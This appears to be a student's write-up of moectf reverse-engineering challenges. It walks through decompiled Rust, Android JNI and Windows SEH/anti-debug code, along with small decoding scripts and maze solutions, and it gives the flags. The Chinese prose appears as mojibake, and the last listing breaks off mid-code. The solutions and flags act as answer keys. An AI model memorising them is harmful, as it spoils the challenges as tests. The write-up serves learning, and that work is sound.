<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Str1 = <span class="string">&#x27;hj`^oavt+pZm`h+q._&#x27;</span></span><br><span class="line">Str1 = [<span class="built_in">ord</span>(i) + <span class="number">5</span> <span class="keyword">for</span> i <span class="keyword">in</span> Str1]</span><br><span class="line"></span><br><span class="line">Str2 = [</span><br><span class="line">    <span class="number">0x39</span>, <span class="number">0x12</span>, <span class="number">0x0E</span>, <span class="number">0x55</span>, <span class="number">0x39</span>, <span class="number">0x0C</span>, <span class="number">0x13</span>, <span class="number">0x08</span>,</span><br><span class="line">    <span class="number">0x0D</span>, <span class="number">0x39</span>, <span class="number">0x05</span>, <span class="number">0x56</span>, <span class="number">0x02</span>, <span class="number">0x55</span>, <span class="number">0x47</span>, <span class="number">0x47</span>,</span><br><span class="line">    <span class="number">0x47</span>, <span class="number">0x1B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">]</span><br><span class="line">Str2 = [<span class="built_in">int</span>(i) ^ <span class="number">0x66</span> <span class="keyword">for</span> i <span class="keyword">in</span> Str2]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Str1)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(Str1[i]),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Str2)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(Str2[i]),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="RUST"><a href="#RUST" class="headerlink" title="RUST"></a>RUST</h2><p>cargoæ˜¯rustçš„åŒ…ç®¡ç†å™¨</p>
<p>cargo new project_aaaa åˆ›å»ºä¸€ä¸ªé¡¹ç›®</p>
<p>cargo bulid æ„å»º cargo run è¿è¡Œ</p>
<p><a target="_blank" rel="noopener" href="https://rustwiki.org/zh-CN/book/">https://rustwiki.org/zh-CN/book/</a> ruståŸºç¡€è¯­æ³•</p>
<p>åç¼–è¯‘åçš„ä»£ç é‡æ¯”è¾ƒå¤šï¼Œå¯¹äºå®¹å™¨è¿˜æœ‰ä¸€äº›å‡½æ•°çš„æ“ä½œï¼Œä¼šæœ‰å¾ˆå¤šç±»å‹æ ¡éªŒï¼Œå€¼æ ¡éªŒçš„æ“ä½œï¼Œæ‰€ä»¥ä¼ªä»£ç ä¼šæ¯”è¾ƒå¤š</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">v28</span> = <span class="type">String</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line">    </span><br><span class="line">    std::io::<span class="title function_ invoke__">stdin</span>().<span class="title function_ invoke__">read_line</span>(&amp;<span class="keyword">mut</span> v28).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> <span class="variable">input</span> = v28.<span class="title function_ invoke__">trim_end</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> input.<span class="title function_ invoke__">len</span>() != <span class="number">30</span> &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Error: Input length must be 30 characters&quot;</span>);</span><br><span class="line">        std::process::<span class="title function_ invoke__">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> <span class="variable">byte_array</span>: <span class="type">Vec</span>&lt;<span class="type">u8</span>&gt; = <span class="built_in">vec!</span>[</span><br><span class="line">        <span class="number">0xE5</span>, <span class="number">0xE7</span>, <span class="number">0xED</span>, <span class="number">0xEB</span>, <span class="number">0xFC</span>, <span class="number">0xEE</span>, <span class="number">0xF3</span>, <span class="number">0xDA</span>,</span><br><span class="line">        <span class="number">0xFD</span>, <span class="number">0xFB</span>, <span class="number">0xFC</span>, <span class="number">0xD7</span>, <span class="number">0xFA</span>, <span class="number">0xED</span>, <span class="number">0xFE</span>, <span class="number">0xD7</span>,</span><br><span class="line">        <span class="number">0xFF</span>, <span class="number">0xE1</span>, <span class="number">0xE4</span>, <span class="number">0xE4</span>, <span class="number">0xD7</span>, <span class="number">0xEA</span>, <span class="number">0xED</span>, <span class="number">0xD7</span>,</span><br><span class="line">        <span class="number">0xE9</span>, <span class="number">0xFF</span>, <span class="number">0xEE</span>, <span class="number">0xFD</span>, <span class="number">0xB9</span>, <span class="number">0xF5</span></span><br><span class="line">    ];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">v34</span>: <span class="type">Vec</span>&lt;<span class="type">u8</span>&gt; = input.<span class="title function_ invoke__">chars</span>().<span class="title function_ invoke__">map</span>(|c| c <span class="keyword">as</span> <span class="type">u8</span>).<span class="title function_ invoke__">collect</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">v38</span> = <span class="literal">true</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">for</span> (i, &amp;byte) <span class="keyword">in</span> byte_array.<span class="title function_ invoke__">iter</span>().<span class="title function_ invoke__">enumerate</span>() &#123;</span><br><span class="line">        <span class="keyword">if</span> byte ^ <span class="number">0x88</span> != v34[i] &#123;</span><br><span class="line">            v38 = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> v38 &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Failure&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å¤§æ¦‚æ˜¯è¿™æ ·çš„ä¸€ä¸ªé€»è¾‘</p>
<p>å¾—åˆ°flag moectf{Rust_rev_will_be_awfu1}</p>
<h2 id="ezandroid"><a href="#ezandroid" class="headerlink" title="ezandroid"></a>ezandroid</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> input.getText().toString();</span><br><span class="line">                <span class="keyword">if</span> (s.length() != <span class="number">23</span>) &#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="built_in">this</span>.getApplicationContext(), <span class="string">&quot;é•¿åº¦ä¸å¯¹å“¦&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (MainActivity.<span class="built_in">this</span>.check(s) == <span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="type">Context</span> <span class="variable">applicationContext</span> <span class="operator">=</span> MainActivity.<span class="built_in">this</span>.getApplicationContext();</span><br><span class="line">                    Toast.makeText(applicationContext, <span class="string">&quot;OK!RIGHT,flag is moectf&#123;&quot;</span> + s + <span class="string">&quot;&#125;&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="built_in">this</span>.getApplicationContext(), <span class="string">&quot;Try to reverse the native lib!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">check</span><span class="params">(String str)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    System.loadLibrary(<span class="string">&quot;ezandroid&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ ¹æ®hintå»æŸ¥è¯¢èµ„æ–™äº†è§£åˆ°jniçš„ä»£ç å­˜å‚¨åœ¨libç›®å½•ä¸‹çš„.soæ–‡ä»¶é‡Œé¢ï¼Œç„¶ååœ¨è°ƒç”¨è¿™äº›å‡½æ•°ä¹‹å‰åˆ†åŠ¨æ€æ³¨å†Œå’Œé™æ€æ³¨å†Œï¼Œé™æ€æ³¨å†Œçš„è¯æœç´¢ä¸€ä¸ªå®Œæ•´è·¯å¾„çš„ç±»åå°±èƒ½æ‰¾åˆ°ä»£ç ä½ç½®ï¼ŒåŠ¨æ€æ³¨å†Œçš„è¯åœ¨æ³¨å†Œçš„ä½ç½®ä¸€è·¯æ‰¾åˆ°å¼•ç”¨åç¼–è¯‘å°±èƒ½æ‰¾åˆ°ä½ç½®</p>
<p>å­˜åœ¨jni_onloadå°±æ˜¯åŠ¨æ€æ³¨å†Œ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">qword_3BF8 = sub_173C(v6, <span class="string">&quot;com/doctor3/ezandroid/MainActivity&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( qword_3BF8 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (sub_1770(v6, qword_3BF8, off_2938, <span class="number">1LL</span>) &amp; <span class="number">0x80000000</span>) != <span class="number">0</span> )</span><br><span class="line">        v4 = <span class="number">-1</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v4 = <span class="number">65540</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªsub_1770åº”è¯¥æ˜¯æ³¨å†Œçš„å‡½æ•°ï¼Œoff_2938åº”è¯¥æ˜¯è¦æ‰¾çš„ä¸œè¥¿</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">                                        ; LOAD:<span class="number">0000000000000168</span>â†‘o ...</span><br><span class="line">.data.rel.ro:<span class="number">0000000000002938</span> off_2938        DCQ aCheck              ; DATA XREF: JNI_OnLoad+<span class="number">148</span>â†‘o</span><br><span class="line">.data.rel.ro:<span class="number">0000000000002938</span>                                         ; <span class="string">&quot;check&quot;</span></span><br><span class="line">.data.rel.ro:<span class="number">0000000000002940</span>                 DCQ aLjavaLangStrin     ; <span class="string">&quot;(Ljava/lang/String;)I&quot;</span></span><br><span class="line">.data.rel.ro:<span class="number">0000000000002948</span>                 DCQ sub_17B4</span><br></pre></td></tr></table></figure>

<p>èƒ½çœ‹åˆ°ä¼ å‚çš„ç±»å‹ sub17B4å°±æ˜¯checkçš„å®ç°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> __fastcall <span class="title function_">sub_D7C</span><span class="params">(_BYTE *inputString)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *v1; <span class="comment">// x8</span></span><br><span class="line">  <span class="type">bool</span> v3; <span class="comment">// [xsp+14h] [xbp-1Ch]</span></span><br><span class="line">  <span class="type">char</span> *flag; <span class="comment">// [xsp+18h] [xbp-18h]</span></span><br><span class="line">  _BOOL4 v6; <span class="comment">// [xsp+2Ch] [xbp-4h]</span></span><br><span class="line"></span><br><span class="line">  flag = &amp;asc_3B50[<span class="number">18</span>];</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *inputString )</span><br><span class="line">      v3 = *flag != <span class="number">42</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = inputString++;</span><br><span class="line">      <span class="keyword">switch</span> ( *v1 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">          --flag;</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">          ++flag;</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">          flag += <span class="number">15</span>;</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">          flag -= <span class="number">15</span>;</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          v6 = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = *flag == <span class="number">35</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>wsåº”è¯¥æ˜¯ä¸Šä¸‹ç§»çš„æ„æ€ï¼Œå¯ä»¥çŸ¥é“è¿·å®«çš„å®½åº¦ä¸º15</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">***************</span><br><span class="line">***@******#****</span><br><span class="line">***.******.****</span><br><span class="line">*...******.****</span><br><span class="line">*.********.****</span><br><span class="line">*.****.....****</span><br><span class="line">*.****.********</span><br><span class="line">*......********</span><br><span class="line">***************</span><br></pre></td></tr></table></figure>

<p>è¯•äº†ä¸€ä¸‹é”™äº†ï¼Œé‡æ–°çœ‹äº†ä¸€ä¸‹ï¼Œå‘ç°çœ‹çš„æ¯”è¾ƒå¿« å¼€å¤´æœ‰ä¸ªmemcpyå¿½ç•¥äº†</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strcpy</span>(</span><br><span class="line">  v7,</span><br><span class="line">  <span class="string">&quot;******************@**************.************...****#..*****.********.*****.****.....*****.****.*********......****&quot;</span></span><br><span class="line">  <span class="string">&quot;*******************&quot;</span>);</span><br><span class="line">v5 = __strlen_chk(v7, <span class="number">0x88</span>u);</span><br><span class="line">__memcpy_chk(asc_3B50, v7, v5, <span class="number">136LL</span>);</span><br></pre></td></tr></table></figure>

<p>asc_3B50å°±æ˜¯çœ‹é”™çš„é‚£ä¸ªè¿·å®«çš„åœ°å€</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">***************</span><br><span class="line">***@***********</span><br><span class="line">***.***********</span><br><span class="line">*...****#..****</span><br><span class="line">*.********.****</span><br><span class="line">*.****.....****</span><br><span class="line">*.****.********</span><br><span class="line">*......********</span><br><span class="line">***********</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>moectf{ssaassssdddddwwddddwwaa}</p>
<h2 id="GUI-æœ‰é—®é¢˜"><a href="#GUI-æœ‰é—®é¢˜" class="headerlink" title="GUI [æœ‰é—®é¢˜]"></a>GUI [æœ‰é—®é¢˜]</h2><p>dieæ˜¾ç¤ºæ˜¯.net </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WndClass.lpfnWndProc = sub_450CDF;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œè®¾ç½®äº†çª—å£è¿‡ç¨‹çš„å‡½æ•°æŒ‡é’ˆï¼Œä»–ä¼šå¤„ç†çª—å£ç›¸å…³çš„ä¿¡æ¯</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LRESULT __stdcall <span class="title function_">sub_45BF90</span><span class="params">(HWND hWndParent, UINT Msg, WPARAM wParam, LPARAM lParam)</span></span><br></pre></td></tr></table></figure>

<p>hWbdParentæ˜¯çª—å£çš„å¥æŸ„ï¼Œmsgæ˜¯æ¶ˆæ¯çš„idï¼Œè¿™ä¸ªwparamå’Œlparamå¥½åƒæ˜¯ä¼šæ ¹æ®æ¶ˆæ¯çš„ä¸åŒç©¿è¿‡æ¥ä¸åŒçš„é™„åŠ æ¶ˆæ¯ã€‚</p>
<p>å…³é”®æ˜¯è¿™é‡Œï¼Œè¿™é‡Œæ˜¯æœ‰ä¸ªc++ç±»ï¼Œidaå°†è¿™ä¸ªç±»å¹³å¦å¼€äº†ï¼Œæ˜¾ç¤ºå¾ˆå¥‡æ€ªï¼Œæ‰€ä»¥è¿˜æ˜¯ä»æ±‡ç¼–çš„è§†å›¾å»åˆ†æé€»è¾‘</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="type">unsigned</span> __int16)wParam == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        DlgItem = GetDlgItem(hWndParent, <span class="number">2</span>);</span><br><span class="line">        GetWindowTextW(DlgItem, String, <span class="number">1024</span>);</span><br><span class="line">        sub_450C94(String);</span><br><span class="line">        v13 = <span class="number">0</span>;</span><br><span class="line">        sub_450A0A(v7, v8);</span><br><span class="line">        LOBYTE(v13) = <span class="number">1</span>;</span><br><span class="line">        sub_450C94(a91);</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)sub_4531AB(v7, v6) )</span><br><span class="line">          MessageBoxW(hWndParent, Text, <span class="string">L&quot;hint&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          MessageBoxW(hWndParent, <span class="string">L&quot;Sorry, flag error.&quot;</span>, <span class="string">L&quot;hint&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        sub_4529B8(v6);</span><br><span class="line">        LOBYTE(v13) = <span class="number">0</span>;</span><br><span class="line">        sub_4529B8(v7);</span><br><span class="line">        v13 = <span class="number">-1</span>;</span><br><span class="line">        sub_4529B8(v8);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>



<p>ä»inputStringå¼€å§‹åˆ†æï¼Œè¿™é‡Œecxçœ‹èµ·æ¥å¾ˆå¥‡æ€ªï¼ŒæŸ¥è¯¢èµ„æ–™æ‰çŸ¥é“è¿™ä¸ªecxæ˜¯ä¸€ä¸ªthisæŒ‡é’ˆ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push    eax             ; hWnd</span><br><span class="line">call    ds:GetWindowTextW</span><br><span class="line">cmp     esi, esp</span><br><span class="line">call    j___RTC_CheckEsp</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">lea     eax, [ebp+String]</span><br><span class="line">push    eax</span><br><span class="line">lea     ecx, [ebp+var_498]</span><br><span class="line">call    sub_450C94</span><br><span class="line">mov     [ebp+var_4], <span class="number">0</span></span><br><span class="line">lea     eax, [ebp+var_498]</span><br><span class="line">push    eax</span><br><span class="line">lea     ecx, [ebp+var_4BC]</span><br><span class="line">push    ecx</span><br><span class="line">call    sub_450A0A</span><br><span class="line">add     esp, <span class="number">8</span></span><br></pre></td></tr></table></figure>







<h2 id="unwind"><a href="#unwind" class="headerlink" title="unwind"></a>unwind</h2><p>è¿™ä¸ªé¢˜ä¸€å¼€å§‹å’±é‡åˆ°æŒºå¤šé—®é¢˜çš„ï¼Œä¸è¿‡ä¹Ÿå­¦ä¼š sehçš„ç¨‹åºæ€ä¹ˆåˆ†æï¼Œå“ªäº›æ“ä½œä¼šå‡ºç°å¼‚å¸¸è¢«tryå—æ•è· åŠ¨æ€è°ƒè¯• ä¸€ç‚¹ç‚¹æ‰¾åè°ƒè¯•å‡½æ•°çš„æ–¹æ³•ã€‚</p>
<p>ä¸€å¼€å§‹æˆ‘å°±ä»é™æ€ä¸Šåˆ†æï¼Œå…ˆå»å­¦ä¹ äº†SEHå¤§æ¦‚æ˜¯æ€ä¹ˆæ ·çš„ä¸€ä¸ªä¸œè¥¿ï¼Œç„¶åæ˜ç™½äº†SEHä¼šå¯¹æˆ‘åˆ†æç¨‹åºè¿è¡Œé¡ºåºæµç¨‹æœ‰å½±å“ï¼Œæ‰€ä»¥æˆ‘éœ€è¦å…³æ³¨ä»€ä¹ˆæ±‡ç¼–ä»£ç ä¼šå‡ºç°å¼‚å¸¸ï¼Œtryå—æ•è·åä¼šè·³è½¬åˆ°å“ªé‡Œã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00415908</span> ;   __try &#123; <span class="comment">// __except at loc_415928</span></span><br><span class="line">.text:<span class="number">00415908</span>                 mov     [ebp+ms_exc.registration.TryLevel], <span class="number">0</span></span><br><span class="line">.text:<span class="number">0041590F</span>                 mov     large dword ptr ds:<span class="number">0</span>, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0041590F</span> ;   &#125; <span class="comment">// starts at 415908</span></span><br><span class="line">.text:<span class="number">00415919</span>                 mov     [ebp+ms_exc.registration.TryLevel], <span class="number">0F</span>FFFFFFEh</span><br><span class="line">.text:<span class="number">00415920</span>                 jmp     <span class="type">short</span> loc_41597A</span><br></pre></td></tr></table></figure>

<p>è¿™æ˜¯ç¬¬ä¸€ä¸ªtryå—ï¼Œè¿™é‡Œå¾€ds:0 å†™æ•°æ®æ˜¯ä¼šè§¦å‘ä¸€ä¸ªå¼‚å¸¸çš„ï¼ŒæŸ¥è¯¢èµ„æ–™åçŸ¥é“, ds:0æ˜¯æ“ä½œç³»ç»Ÿæ•è·ç©ºæŒ‡é’ˆè§£å¼•ç”¨çš„åœ°å€ï¼Œè¿™ä¸ªåœ°å€æ˜¯å—ä¿æŠ¤çš„ï¼Œå†™æ•°æ®ä¼šè§¦å‘å¼‚å¸¸</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00411820</span> sub_411820      proc near               ; CODE XREF: sub_4110FFâ†‘j</span><br><span class="line">.text:<span class="number">00411820</span></span><br><span class="line">.text:<span class="number">00411820</span> var_E4          = dword ptr <span class="number">-0E4</span>h</span><br><span class="line">.text:<span class="number">00411820</span> var_10          = byte ptr <span class="number">-10</span>h</span><br><span class="line">.text:<span class="number">00411820</span> var_C           = dword ptr <span class="number">-0</span>Ch</span><br><span class="line">.text:<span class="number">00411820</span> var_4           = dword ptr <span class="number">-4</span></span><br><span class="line">.text:<span class="number">00411820</span></span><br><span class="line">.text:<span class="number">00411820</span>                 push    ebp</span><br><span class="line">.text:<span class="number">00411821</span>                 mov     ebp, esp</span><br><span class="line">.text:<span class="number">00411823</span>                 sub     esp, <span class="number">0</span>D0h</span><br><span class="line">.text:<span class="number">00411829</span>                 push    ebx</span><br><span class="line">.text:<span class="number">0041182</span>A                 push    esi</span><br><span class="line">.text:<span class="number">0041182B</span>                 push    edi</span><br><span class="line">.text:<span class="number">0041182</span>C                 lea     edi, [ebp+var_10]</span><br><span class="line">.text:<span class="number">0041182F</span>                 mov     ecx, <span class="number">4</span></span><br><span class="line">.text:<span class="number">00411834</span>                 mov     eax, <span class="number">0</span>CCCCCCCCh</span><br><span class="line">.text:<span class="number">00411839</span>                 rep stosd</span><br><span class="line">.text:<span class="number">0041183B</span>                 mov     eax, ___security_cookie</span><br><span class="line">.text:<span class="number">00411840</span>                 xor     eax, ebp</span><br><span class="line">.text:<span class="number">00411842</span>                 mov     [ebp+var_4], eax</span><br><span class="line">.text:<span class="number">00411845</span>                 mov     [ebp+var_C], offset loc_4112FD</span><br><span class="line">.text:<span class="number">0041184</span>C                 push    [ebp+var_C]</span><br><span class="line">.text:<span class="number">0041184F</span>                 push    large dword ptr fs:<span class="number">0</span></span><br><span class="line">.text:<span class="number">00411856</span>                 mov     large fs:<span class="number">0</span>, esp</span><br><span class="line">.text:<span class="number">0041185</span>D                 <span class="type">int</span>     <span class="number">3</span>               ; Trap to Debugger</span><br><span class="line">.text:<span class="number">0041185</span>E                 mov     eax, [esp+<span class="number">0E4</span>h+var_E4]</span><br><span class="line">.text:<span class="number">00411861</span>                 mov     large fs:<span class="number">0</span>, eax</span><br><span class="line">.text:<span class="number">00411867</span>                 add     esp, <span class="number">8</span></span><br><span 